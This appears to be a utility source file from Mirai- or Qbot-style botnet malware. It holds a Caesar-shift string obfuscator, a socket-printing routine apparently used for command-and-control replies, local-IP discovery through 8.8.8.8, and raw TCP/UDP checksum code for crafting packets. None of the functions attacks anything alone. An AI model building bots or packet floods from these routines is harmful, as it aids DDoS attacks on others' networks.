#include <stdlib.h>
#include <stdarg.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <ctype.h>
#include "headers/util.h"

int util_encryption(char *string)
{
	int r;
	for(r = 0; (r < 100 && string[r] != '\0'); r++)
	string[r] = string[r] - 3;
	return 0; 
}

void util_trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static void util_printchar(unsigned char **str, int c) 
{
	if(str) 
	{
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}

static int util_prints(unsigned char **out, const unsigned char *string, int width, int pad) 
{
	register int pc = 0, padchar = ' ';
	if(width > 0) 
	{
		register int len = 0;
		register const unsigned char *ptr;
		for(ptr = string; *ptr; ++ptr) ++len;
		if(len >= width) width = 0;
		else width -= len;
		if(pad & PAD_ZERO) padchar = '0';
	}
	if(!(pad & PAD_RIGHT)) 
	{
		for(; width > 0; --width) 
		{
			util_printchar(out, padchar);
			++pc;
		}
	}
	for(; *string; ++string) 
	{
		util_printchar(out, *string);
		++pc;
	}
	for(; width > 0; --width) 
	{
		util_printchar(out, padchar);
		++pc;
	}
	return pc;
}

static int util_printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) 
{
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;
	if(i == 0) 
	{
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return util_prints(out, print_buf, width, pad);
	}
	if(sg && b == 10 && i < 0) 
	{
		neg = 1;
		u = -i;
	}
	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';
	while(u) 
	{
		t = u % b;
		if(t >= 10)
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}
	if(neg) 
	{
		if(width && (pad & PAD_ZERO)) 
		{
			util_printchar(out, '-');
			++pc;
			--width;
		} 
		else 
		{
			*--s = '-';
		}	
	}
	return pc + util_prints (out, s, width, pad);
}

static int util_print(unsigned char **out, const unsigned char *format, va_list args ) 
{
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];
	for(; *format != 0; ++format) 
	{
		if(*format == '%') 
		{
			++format;
			width = pad = 0;
			if(*format == '\0') break;
			if(*format == '%') goto out;
			if(*format == '-') 
			{
				++format;
				pad = PAD_RIGHT;
			}
			while(*format == '0') 
			{
				++format;
				pad |= PAD_ZERO;
			}
			for(; *format >= '0' && *format <= '9'; ++format) 
			{
				width *= 10;
				width += *format - '0';
			}
			if(*format == 's') 
			{	
				int r;
				char str[] = {"+qxoo,"};
				for(r = 0; (r < 100 && str[r] != '\0'); r++)
				str[r] = str[r] - 3;
				register char *s = (char *)va_arg( args, intptr_t );
				pc += util_prints (out, s?s:str, width, pad);
				continue;
			}
			if(*format == 'd') 
			{
				pc += util_printi (out, va_arg(args, int), 10, 1, width, pad, 'a');
				continue;
			}
			if(*format == 'x') 
			{
				pc += util_printi (out, va_arg(args, int), 16, 0, width, pad, 'a');
				continue;
			}
			if(*format == 'X') 
			{
				pc += util_printi (out, va_arg(args, int), 16, 0, width, pad, 'A');
				continue;
			}
			if(*format == 'u') 
			{
				pc += util_printi (out, va_arg(args, int), 10, 0, width, pad, 'a');
				continue;
			}
			if(*format == 'c') 
			{
				scr[0] = (unsigned char)va_arg(args, int);
				scr[1] = '\0';
				pc += util_prints (out, scr, width, pad);
				continue;
			}
		} 
		else 
		{
			out:
			util_printchar (out, *format);
			++pc;
		}
	}
	if(out) **out = '\0';
	va_end(args);
	return pc;
}

int util_sockprint(int sock, char *formatStr, ...) 
{
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	util_print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;
    if(mem_len > buf_len)
        return -1;
    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }
    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);
    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;
    for(sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if(count == 1)
        sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    while(len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }
    if(len == 1)
        sum += *((uint8_t *) buf);
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;
    while(sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ((uint16_t) (~sum));
}
